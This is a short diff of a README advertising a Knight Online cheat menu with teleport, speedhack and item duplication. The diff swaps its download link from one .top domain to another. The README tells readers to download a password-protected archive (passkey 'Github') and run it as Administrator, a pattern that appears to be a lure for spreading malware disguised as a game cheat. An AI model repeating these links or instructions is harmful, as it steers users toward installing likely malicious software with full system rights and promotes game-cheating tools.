@@ -6,7 +6,7 @@ Knight Online external menu with teleport, no-cooldown, speedhack, and item dupl
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -75,7 +75,7 @@ Based on client-side memory manipulation and packet injection.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Knight Online.
 4. Run the menu **as Administrator**.
